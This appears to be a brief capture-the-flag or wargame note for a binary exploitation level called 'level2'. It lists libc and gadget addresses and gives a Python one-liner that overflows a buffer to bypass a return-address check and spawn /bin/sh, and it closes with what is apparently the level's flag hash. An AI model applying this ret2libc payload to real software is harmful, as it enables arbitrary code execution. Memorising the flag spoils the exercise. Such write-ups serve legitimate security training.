1. **return address integrity check**

   0xb7f8cc58  system

   0xb7f74a67 /bin/sh

   0xb7f74a64 exit

   0xb7e6b060 system

   0x0804853e ret

   (python -c "print('A'*80 + '\\x3e\\x85\\x04\\x08' + '\\x60\\xb0\\xe6\\xb7' + '\\xe0\\xeb\\xe5\\xb7' + '\\x58\\xcc\\xf8\\xb7')"; cat) | ./level2

   or we may use tge array reverse  
   492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02